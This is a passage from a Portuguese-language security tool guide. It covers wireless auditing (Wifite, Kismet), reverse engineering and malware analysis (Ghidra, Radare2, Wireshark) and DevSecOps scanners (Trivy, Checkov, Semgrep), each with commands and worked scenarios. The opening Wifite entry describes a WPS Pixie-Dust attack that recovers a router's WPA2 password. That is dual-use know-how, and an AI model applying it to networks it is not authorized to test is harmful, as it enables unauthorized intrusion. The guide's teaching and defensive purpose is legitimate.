  - **Resultado Esperado:** O Wifite identificará automaticamente a vulnerabilidade WPS, executará um ataque *Pixie-Dust* (exploração de aleatoriedade criptográfica fraca na implementação) contra o roteador. Em caso de sucesso, exibirá diretamente no terminal tanto o PIN de 8 dígitos do WPS quanto a senha WPA2-PSK em texto claro derivada, sem exigir qualquer ataque de força bruta prolongado contra a senha propriamente dita.



## **9.3 Kismet**

- **Descrição Acadêmica/Técnica:** O Kismet é um *framework* de detecção, coleta e análise de redes sem fio, desenvolvido em C++, que opera como um *sniffer* passivo multiplataforma e multiprotocolo (802.11 Wi-Fi, Bluetooth Classic/BLE, Zigbee, RFID e Sistemas de Rádio Definido por Software  SDR). Diferente do Aircrack-ng, cuja arquitetura é centrada primariamente em quebra criptográfica ativa, o Kismet é arquitetado como uma plataforma de inteligência de sinais (*Signals Intelligence*/SIGINT) contínua e passiva, empregando um modelo *servidor-cliente*: um processo *backend* (kismetserver) gerencia múltiplas fontes de captura simultâneas (várias placas Wi-Fi, dongles Bluetooth, receptores SDR) e agrega os dados em um banco relacional (SQLite), enquanto a interface web (kismetclient, acessível via navegador) exibe visualizações em tempo real, incluindo detecção heurística de anomalias como *rogue access points*, ataques de desautenticação em andamento e dispositivos realizando *fingerprinting* via *probe requests*.  
- **Principais Funcionalidades:**  
  - Detecção e monitoramento passivo e simultâneo de múltiplos protocolos sem fio (802.11, Bluetooth, Zigbee) através de fontes de captura concorrentes.  
  - Identificação heurística de anomalias de segurança em tempo real, como *rogue access points*, redes duplicadas (*Evil Twin*) e ataques de desautenticação ativos.  
  - Rastreamento detalhado (*fingerprinting*) de dispositivos móveis e clientes através da análise de *probe requests* e padrões de endereço MAC.  
  - Interface web nativa para visualização, mapeamento GPS e análise histórica dos dados coletados armazenados em banco de dados SQLite.  
  - Arquitetura extensível via plugins para suporte a novos tipos de fontes de captura, incluindo receptores de Rádio Definido por Software (SDR).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização do servidor especificando a interface de captura sem fio a ser utilizada

sudo kismet c interfacesemfio

 Inicialização com múltiplas fontes de captura simultâneas (ex: Wi-Fi e Bluetooth)

sudo kismet c interfacewifi c interfacebluetooth

 Acesso à interface web de visualização e análise (padrão: porta 2501

 Navegador: [http://localhost:2501](http://localhost:2501)

 Consulta programática direta aos dispositivos detectados via API REST do Kismet

curl s [http://localhost:2501/devices/all\_devices.json](http://localhost:2501/devices/all\_devices.json) u usuario:senha

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante uma auditoria de segurança física contínua em um escritório corporativo, a equipe de segurança suspeita da presença de um *rogue access point* — um ponto de acesso não autorizado, possivelmente instalado maliciosamente por um insider, imitando o SSID legítimo da rede corporativa para capturar credenciais de funcionários desavisados (*Evil Twin*).  
  - **Execução Prática:** O analista posiciona um dispositivo com o Kismet em execução contínua (sudo kismet c wlan1mon) em um local central do escritório, monitorando passivamente por um período de 24 horas. Periodicamente, acessa a interface web em [http://localhost:2501](http://localhost:2501) para revisar os alertas gerados automaticamente pelo motor de detecção de anomalias.  
  - **Resultado Esperado:** O Kismet identificará e alertará sobre duas redes distintas fisicamente (endereços MAC/BSSID diferentes) transmitindo exatamente o mesmo SSID corporativo, classificando o evento como uma possível anomalia de *Evil Twin*. O relatório incluirá o endereço MAC do dispositivo suspeito, a intensidade do sinal (permitindo estimativa de localização física) e o histórico temporal de sua atividade, fornecendo evidências concretas para uma investigação de segurança física subsequente.



# **10  Engenharia Reversa e Análise de Malware.**

Esta seção desloca o foco do tráfego de rede e da infraestrutura para a análise de baixo nível do próprio código binário. O objetivo é compreender o funcionamento interno de executáveis desconhecidos ou maliciosos — seja através da reconstrução de sua lógica sem execução (análise estática/descompilação), da observação de seu comportamento em tempo de execução (análise dinâmica/debugging), ou da inspeção do tráfego de rede gerado por artefatos maliciosos.

## **10.1 Ghidra**

- **Descrição Acadêmica/Técnica:** O Ghidra é um *framework* de engenharia reversa de código aberto, desenvolvido em Java/C++ e mantido pela *National Security Agency* (NSA), projetado para a análise estática avançada de binários compilados em múltiplas arquiteturas (x86, ARM, MIPS, entre outras). Seu componente central é um motor de descompilação que traduz instruções de linguagem *assembly* de baixo nível em um pseudocódigo estruturado de alto nível, sintaticamente similar à linguagem C, facilitando drasticamente a compreensão da lógica do programa sem a necessidade de interpretar manualmente milhares de instruções de máquina. Em baixo nível, o Ghidra opera através da análise automática de referências cruzadas (*cross-references*), reconstrução de estruturas de dados, inferência de tipos de variáveis e identificação de convenções de chamada de função, permitindo a renomeação e anotação colaborativa de artefatos binários através de sua arquitetura de projetos compartilháveis.  
- **Principais Funcionalidades:**  
  - Descompilação automática de código *assembly* para um pseudocódigo legível de alto nível (P-Code).  
  - Suporte nativo a dezenas de arquiteturas de processador e formatos de executável (PE, ELF, Mach-O).  
  - Análise de referências cruzadas (*cross-references*) entre funções, variáveis e strings, facilitando o rastreamento de fluxo lógico.  
  - Motor de *scripting* extensível via Java e Python (Jython) para automação de tarefas repetitivas de análise.  
  - Suporte a colaboração multiusuário em projetos compartilhados através de um servidor dedicado (*Ghidra Server*).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização da interface gráfica principal

ghidraRun

 Execução em modo headless (linha de comando), para análise automatizada de um binário sem interface gráfica

analyzeHeadless diretoriodoprojeto nomedoprojeto import caminhodobinario

 Execução em modo headless aplicando um script customizado de análise pós-importação

analyzeHeadless diretoriodoprojeto nomedoprojeto process nomedobinario scriptPath diretorioscripts postScript nomedoscript.py

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** O analista recebeu uma amostra de *malware* desconhecida (sample.exe) isolada em um ambiente controlado e precisa compreender sua lógica interna — especificamente, identificar o domínio ou endereço IP do servidor de Comando e Controle (C2) codificado (*hardcoded*) dentro do binário, sem executar o código em um ambiente de produção.  
  - **Execução Prática:** O analista importa o binário sample.exe em um novo projeto Ghidra e executa a análise automática padrão (*Auto Analysis*). Utilizando a janela de *Strings* (Window  Defined Strings), localiza uma string suspeita semelhante a uma URL. Ao clicar duplamente sobre ela, o Ghidra navega automaticamente até a função que referencia (*cross-reference*) aquele endereço de memória.  
  - **Resultado Esperado:** O painel de descompilação (*Decompile*) exibirá o pseudocódigo em C da função responsável pela comunicação de rede, revelando claramente a construção da URL do servidor C2 concatenada com outros parâmetros (ex: identificador único da máquina infectada), permitindo ao analista documentar o *Indicator of Compromise* (IoC) para bloqueio em *firewalls* corporativos.



## **10.2 Radare2**

- **Descrição Acadêmica/Técnica:** O Radare2 (r2) é um *framework* de engenharia reversa e forense digital de código aberto, escrito em C, arquitetado com uma filosofia radicalmente diferente do Ghidra: prioriza uma interface baseada em linha de comando extremamente compacta e um design modular composto por múltiplos utilitários independentes (r2, rabin2, radiff2, rahash2), interligados por uma sintaxe de comandos mnemônica e altamente componível. Em baixo nível, seu núcleo (libr) implementa desde o *parsing* de formatos de arquivo executável e a desmontagem (*disassembly*) de código de máquina, até um depurador (*debugger*) integrado com suporte a múltiplos backends (nativo, GDB remoto, WinDbg), permitindo tanto a análise estática detalhada quanto a instrumentação dinâmica de binários em execução, tudo através de uma única interface textual scriptável.  
- **Principais Funcionalidades:**  
  - Desmontagem (*disassembly*) e análise estática detalhada de binários em múltiplas arquiteturas, com visualização em grafo de fluxo de controle (ASCII art).  
  - Depurador (*debugger*) integrado nativo, permitindo a execução passo a passo, definição de *breakpoints* e inspeção de registradores/memória em tempo real.  
  - Comparação binária (*diffing*) entre versões distintas de um mesmo executável, útil para identificar *patches* de segurança ou variantes de *malware*.  
  - Extensibilidade via *scripting* em múltiplas linguagens (Python, JavaScript) através da API r2pipe.  
  - Extração de metadados estruturais do binário (símbolos, seções, importações/exportações) via o utilitário rabin2.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Abertura de um binário em modo de análise (sem execução) com desmontagem automática completa

r2 A caminhodobinario

 Abertura de um binário diretamente em modo de depuração (execução controlada)

r2 d caminhodobinario

 Dentro da interface: listagem de funções identificadas e navegação até uma função específica

afl

s enderecoounomedafuncao

 Dentro da interface: exibição do pseudocódigo descompilado de uma função (requer plugin r2ghidra)

pdg

 Extração rápida de metadados estruturais do binário (seções, símbolos, imports) via utilitário auxiliar

rabin2 I caminhodobinario

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Durante a análise de um binário suspeito, o analista precisa validar rapidamente, sem depender de uma interface gráfica pesada, se o executável faz uso de funções da API do Windows tipicamente associadas a comportamento malicioso (ex: VirtualAlloc combinado com CreateRemoteThread, indicativo de *process injection*), como etapa inicial de triagem antes de uma análise mais profunda.  
  - **Comandos Executados:**  
  **Bash**

rabin2 i samplesuspeito.exe

r2 A samplesuspeito.exe

afl sub.

- **Resultado Esperado:** O comando rabin2 i listará imediatamente todas as funções importadas pelo binário, exibindo em destaque VirtualAlloc, WriteProcessMemory e CreateRemoteThread na tabela de importações da biblioteca kernel32.dll. Dentro do r2, o comando afl filtrado (sub.) localizará rapidamente as funções internas do binário que referenciam essas chamadas, confirmando a hipótese de técnica de injeção de processo e direcionando a análise dinâmica subsequente para aquele ponto específico do código.



## **10.3 Wireshark**

- **Descrição Acadêmica/Técnica:** O Wireshark é o analisador de protocolos de rede mais utilizado da indústria, desenvolvido em C/C++, projetado para a captura e inspeção granular de tráfego de rede em tempo real ou a partir de arquivos de captura previamente salvos (.pcap/.pcapng). Em baixo nível, a ferramenta utiliza a biblioteca *libpcap* (Linux) ou *Npcap* (Windows) para capturar quadros diretamente da interface de rede em modo promíscuo, e então aplica centenas de *dissectors* — módulos especializados que decodificam progressivamente cada camada do modelo OSI encapsulada dentro de um pacote (desde os cabeçalhos Ethernet e IP até protocolos de aplicação como HTTP, DNS e TLS), reconstruindo a semântica completa da comunicação. Sua funcionalidade de remontagem de fluxo (*Follow TCP/UDP Stream*) reagrupa segmentos de pacotes fragmentados em uma única visualização coesa da conversa completa entre dois hosts, essencial tanto para depuração de protocolos quanto para a análise forense de tráfego malicioso gerado por *malware*.  
- **Principais Funcionalidades:**  
  - Captura de tráfego de rede em tempo real com suporte a modo promíscuo em múltiplas interfaces simultâneas.  
  - Motor de filtros de exibição (*Display Filters*) com sintaxe granular baseada em campos de protocolo específicos.  
  - Remontagem completa de fluxos de conversação (*Follow TCP/UDP/HTTP Stream*) para reconstrução de sessões inteiras.  
  - Suporte à decodificação de tráfego criptografado TLS/SSL, mediante o fornecimento de chaves de sessão previamente exportadas.  
  - Extração e exportação de objetos transferidos dentro do próprio tráfego capturado (ex: arquivos transmitidos via HTTP/SMB).

**Sintaxe e Comandos Principais:**  
**Bash**  
 Inicialização da interface gráfica principal

wireshark

 Captura de tráfego diretamente de uma interface via linha de comando (utilitário tshark), salvando em arquivo

tshark i interfacederede w arquivocaptura.pcapng

 Leitura e aplicação de um filtro de exibição sobre um arquivo de captura previamente salvo, via linha de comando

tshark r arquivocaptura.pcapng Y "filtrodeexibicao"

 Extração de todos os objetos/arquivos identificados dentro de um protocolo específico (ex: HTTP) de uma captura

tshark r arquivocaptura.pcapng -export-objects http,diretoriodesaida

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Após a execução controlada e monitorada de uma amostra de *malware* em um ambiente de sandbox isolado (*Dynamic Malware Analysis*), o tráfego de rede gerado pelo processo foi integralmente capturado. O analista precisa identificar o servidor de Comando e Controle (C2) contatado pela amostra e extrair qualquer arquivo secundário (*second-stage payload*) que tenha sido baixado durante a execução.  
  - **Comandos Executados:**  
  **Bash**

tshark r capturasandboxmalware.pcapng Y "http.request or dns.qryname"

tshark r capturasandboxmalware.pcapng -export-objects http,arquivosextraidos/

- **Resultado Esperado:** O primeiro comando exibirá de forma filtrada e cronológica apenas as consultas DNS e requisições HTTP realizadas pelo processo malicioso, revelando o domínio exato do servidor C2 contatado. O segundo comando varrerá toda a captura e extrairá automaticamente qualquer arquivo binário transferido via HTTP para o diretório arquivosextraidos/, disponibilizando o *payload* secundário para uma análise estática subsequente no Ghidra ou Radare2.



# **11  DevSecOps e Automação de Segurança.**

Esta seção final rompe com o paradigma reativo do *pentest* tradicional (auditoria pontual sobre um sistema já implantado) para adotar uma postura preventiva e contínua. O foco recai sobre ferramentas operáveis via CLI, projetadas para integração nativa em *pipelines* de Integração e Entrega Contínuas (CI/CD), permitindo a detecção automatizada de vulnerabilidades em artefatos de *software*, imagens de contêiner e definições de Infraestrutura como Código (IaC) antes que atinjam o ambiente de produção.

## **11.1 Trivy**

- **Descrição Acadêmica/Técnica:** O Trivy, desenvolvido em Go pela Aqua Security, é um *scanner* de segurança unificado e abrangente, projetado para consolidar múltiplas superfícies de análise (imagens de contêiner, sistemas de arquivos, repositórios Git e definições IaC) em uma única ferramenta de execução rápida. Em baixo nível, ao analisar uma imagem de contêiner, o Trivy realiza a extração e a inspeção das camadas (*layers*) do sistema de arquivos, identificando o gerenciador de pacotes do sistema operacional base (apt, apk, yum) e as dependências de linguagens de aplicação (package.json, requirements.txt, go.mod), correlacionando cada versão identificada contra múltiplos bancos de dados de vulnerabilidades (NVD, GitHub Security Advisories, distribuições Linux) mantidos em cache local para varreduras subsequentes de alta velocidade, sem exigir conectividade repetida com serviços externos.  
- **Principais Funcionalidades:**  
  - Varredura de vulnerabilidades (CVEs) em imagens de contêiner, analisando tanto o sistema operacional base quanto dependências de aplicação.  
  - Detecção de segredos expostos (*secrets scanning*), como chaves de API e credenciais *hardcoded*, diretamente no código-fonte ou em camadas de imagens.  
  - Auditoria de má configuração (*misconfiguration*) em arquivos de Infraestrutura como Código (Terraform, Kubernetes, Dockerfile, CloudFormation).  
  - Geração de *Software Bill of Materials* (SBOM) estruturado, documentando exaustivamente todas as dependências de um artefato.  
  - Saída em múltiplos formatos estruturados (JSON, SARIF, tabela), com suporte nativo a códigos de retorno (*exit codes*) configuráveis para interrupção automática de *pipelines*.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura de vulnerabilidades em uma imagem de contêiner, filtrando exclusivamente severidades críticas e altas

trivy image -severity CRITICAL,HIGH nomedaimagem:tag

 Varredura de um sistema de arquivos local (ex: diretório de um projeto antes do build)

trivy fs caminhododiretorio

 Auditoria de má configuração em arquivos de Infraestrutura como Código

trivy config caminhododiretorioiac

 Varredura com saída estruturada em JSON e código de retorno de falha (útil para gates de CI/CD)

trivy image -exit-code 1 -severity CRITICAL f json o relatorio.json nomedaimagem:tag

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Antes de publicar uma nova imagem de contêiner (api-pagamentos:v2.3) no registro de produção, a esteira de CI/CD precisa garantir automaticamente que a imagem não contenha vulnerabilidades críticas conhecidas em suas dependências de base ou de aplicação, interrompendo o *pipeline* imediatamente caso alguma seja encontrada.  
  - **Comando Executado:**  
  **Bash**

trivy image -exit-code 1 -severity CRITICAL,HIGH api-pagamentos:v2.3

- **Resultado Esperado:** O Trivy extrairá e analisará cada camada da imagem, exibindo uma tabela detalhada de vulnerabilidades encontradas (incluindo o pacote afetado, a versão instalada, a versão corrigida e o identificador CVE). Caso qualquer vulnerabilidade de severidade CRITICAL ou HIGH seja identificada, o comando retornará o código de saída 1, provocando a falha automática (*fail*) da etapa correspondente no *pipeline* de CI/CD e bloqueando a promoção da imagem vulnerável para produção.



## **11.2 Checkov**

- **Descrição Acadêmica/Técnica:** O Checkov, desenvolvido em Python pela Bridgecrew (Palo Alto Networks), é uma ferramenta de análise estática (SAST) especializada exclusivamente na auditoria de Infraestrutura como Código (IaC). Em baixo nível, a ferramenta realiza o *parsing* sintático completo de arquivos de definição de infraestrutura (Terraform, CloudFormation, Kubernetes YAML, ARM Templates, Dockerfile), convertendo-os em uma representação de grafo abstrato de recursos e suas propriedades. Sobre essa representação estruturada, a ferramenta aplica centenas de políticas de segurança predefinidas (*policy-as-code*), verificando programaticamente violações de práticas recomendadas — como *buckets* de armazenamento configurados com acesso público, grupos de segurança de rede permitindo tráfego irrestrito (0.0.0.0/0) ou bancos de dados provisionados sem criptografia em repouso — antes que a infraestrutura seja de fato provisionada no ambiente de nuvem.  
- **Principais Funcionalidades:**  
  - Auditoria estática de centenas de políticas de segurança predefinidas para múltiplos provedores de IaC (Terraform, CloudFormation, Kubernetes, Helm, Dockerfile, ARM).  
  - Detecção de segredos expostos (*hardcoded secrets*) diretamente em arquivos de configuração de infraestrutura.  
  - Suporte à criação de políticas customizadas (*custom policies*) via Python ou uma linguagem declarativa (YAML) para regras específicas da organização.  
  - Geração de relatórios de conformidade mapeados diretamente a frameworks regulatórios (CIS Benchmarks, PCI-DSS, SOC2, HIPAA).  
  - Capacidade de suprimir (*skip*) violações específicas e justificadas diretamente no código através de comentários inline, mantendo rastreabilidade de exceções.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura completa de um diretório contendo arquivos de definição de infraestrutura (ex: Terraform)

checkov d caminhododiretorio

 Varredura restrita a um único arquivo específico, com saída no formato JUnit (integrável em relatórios de CI)

checkov f caminhodoarquivo.tf o junitxml

 Varredura ignorando explicitamente uma verificação específica pelo seu identificador

checkov d caminhododiretorio -skip-check IDdaverificacao

 Varredura filtrando exclusivamente por um framework de conformidade regulatório específico

checkov d caminhododiretorio -framework terraform -compact

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Antes de aplicar (terraform apply) um novo módulo de infraestrutura que provisiona um *bucket* de armazenamento S3 e um banco de dados RDS na AWS, a equipe de DevSecOps precisa garantir automaticamente, dentro do *pipeline* de revisão de *Pull Requests*, que nenhum recurso seja provisionado com configurações de segurança inadequadas (ex: *bucket* público ou banco sem criptografia).  
  - **Comando Executado:**  
  **Bash**

checkov d ./infraestruturaterraform -compact

- **Resultado Esperado:** O Checkov analisará estaticamente todos os arquivos .tf do diretório, exibindo um resumo compacto indicando, por exemplo, a falha na verificação "CKVAWS18: Ensure the S3 bucket has access logging configured" e "CKVAWS16: Ensure that RDS instances have encryption enabled". Essas falhas, identificadas antes do provisionamento real, permitem que o desenvolvedor corrija o código Terraform diretamente no *Pull Request*, evitando a criação de infraestrutura vulnerável em produção.



## **11.3 Semgrep**

- **Descrição Acadêmica/Técnica:** O Semgrep, desenvolvido em OCaml/Python pela Semgrep Inc. (anteriormente r2c), é uma ferramenta de análise estática de código-fonte (SAST) *multi-linguagem*, arquitetada para detectar padrões de vulnerabilidade e má prática de programação sem a necessidade de compilar o código analisado. Em baixo nível, a ferramenta realiza o *parsing* do código-fonte em uma Árvore de Sintaxe Abstrata (AST) genérica e independente de linguagem, sobre a qual aplica regras de correspondência de padrões (*pattern matching*) escritas em uma sintaxe declarativa YAML que se assemelha intencionalmente ao próprio código-fonte alvo, mas com suporte a metavariáveis (ex: $VAR) que capturam expressões arbitrárias. Essa abordagem permite que analistas de segurança escrevam regras customizadas de detecção (ex: identificar chamadas a funções de execução de comando concatenadas com entrada de usuário não sanitizada) com uma curva de aprendizado significativamente menor do que a exigida por ferramentas SAST tradicionais baseadas em análise de fluxo de dados complexa.  
- **Principais Funcionalidades:**  
  - Análise estática de código-fonte (SAST) suportando dezenas de linguagens de programação (Python, JavaScript, Go, Java, C, entre outras).  
  - Motor de regras declarativo e legível (YAML), com suporte a metavariáveis para correspondência de padrões flexíveis.  
  - Repositórios extensos de regras pré-construídas e mantidas pela comunidade (*Semgrep Registry*), mapeadas ao OWASP Top 10 e CWE.  
  - Detecção de vulnerabilidades específicas de linguagem, como injeção de comandos, *deserialization* insegura e uso de funções criptográficas obsoletas.  
  - Integração nativa e otimizada para execução incremental em *pipelines* de CI/CD, analisando exclusivamente os arquivos modificados em um *diff*.

**Sintaxe e Comandos Principais:**  
**Bash**  
 Varredura de um diretório utilizando um conjunto de regras pré-configurado da comunidade (ex: boas práticas OWASP)

semgrep -config p/owasp-top-ten caminhododiretorio

 Varredura utilizando um arquivo de regras customizado escrito pelo próprio analista

semgrep -config caminhoregracustomizada.yaml caminhododiretorio

 Varredura restrita exclusivamente aos arquivos alterados em relação a uma branch base (análise incremental)

semgrep -config auto -baseline-commit hashdocommitbase

 Varredura com saída estruturada em formato SARIF, integrável a plataformas de gestão de vulnerabilidades

semgrep -config auto -sarif o relatorio.sarif caminhododiretorio

- **Exemplo Prático de Aplicação:**  
  - **Cenário:** Uma equipe de desenvolvimento precisa incorporar uma verificação automatizada de segurança de código diretamente no *Pull Request* de um repositório Python, detectando especificamente o uso perigoso da função eval() com entradas potencialmente controláveis pelo usuário, uma prática que introduz risco crítico de execução arbitrária de código.  
  - **Comando Executado:**  
  **Bash**

semgrep -config p/python -config p/owasp-top-ten ./src

- **Resultado Esperado:** O Semgrep percorrerá recursivamente o diretório ./src, e ao encontrar uma linha de código como eval(inputdousuario), reportará uma descoberta (*finding*) indicando a regra violada (ex: python.lang.security.audit.eval-detected), a severidade (ERROR), o número exato da linha no arquivo e uma descrição educativa da vulnerabilidade, permitindo que o desenvolvedor corrija a falha antes mesmo da aprovação e *merge* do código na branch principal.



# **Conclusão**

O percurso estruturado ao longo destas onze seções reflete, de forma deliberada, a progressão lógica de um engajamento de segurança ofensiva completo — desde a coleta inicial e silenciosa de inteligência em fontes abertas (OSINT), passando pelo mapeamento ativo da infraestrutura, a triagem de vulnerabilidades, a exploração de aplicações web, serviços e bancos de dados, até o comprometimento pleno de um ambiente através da escalada de privilégios, da movimentação lateral e da persistência. As seções dedicadas à criptoanálise, à auditoria de redes sem fio e à engenharia reversa complementam esse ciclo com disciplinas técnicas especializadas, indispensáveis tanto para a ofensiva quanto para a resposta a incidentes. Por fim, a incorporação de práticas de DevSecOps demonstra que a cibersegurança contemporânea não se limita a uma auditoria pontual e retrospectiva, mas deve ser internalizada como um processo contínuo, automatizado e integrado ao próprio ciclo de vida do desenvolvimento de *software*.

É fundamental reforçar que todas as ferramentas, técnicas e metodologias documentadas neste guia possuem propósito estritamente educacional, técnico e profissional, devendo ser aplicadas exclusivamente em ambientes controlados, laboratórios próprios ou engajamentos formalmente autorizados por escrito (*Rules of Engagement*), em estrita conformidade com a legislação vigente e os princípios éticos que regem a profissão de segurança da informação. O domínio técnico apresentado neste documento visa capacitar o profissional a antecipar, identificar e mitigar ameaças reais, fortalecendo a postura defensiva de organizações através do conhecimento genuíno das táticas empregadas por agentes maliciosos.

Este guia constitui um documento vivo, sujeito a atualizações contínuas à medida que novas ferramentas, técnicas e vulnerabilidades emergem no cenário de cibersegurança, refletindo o compromisso permanente com a excelência técnica e a atualização profissional contínua.

---

**Autor e Responsável Técnico:** Pedro Augusto Hackner Bittencourt

![Utilize esse guia com sabedoria e apenas em ambientes controlados](docs/assets/img/aviso.webp)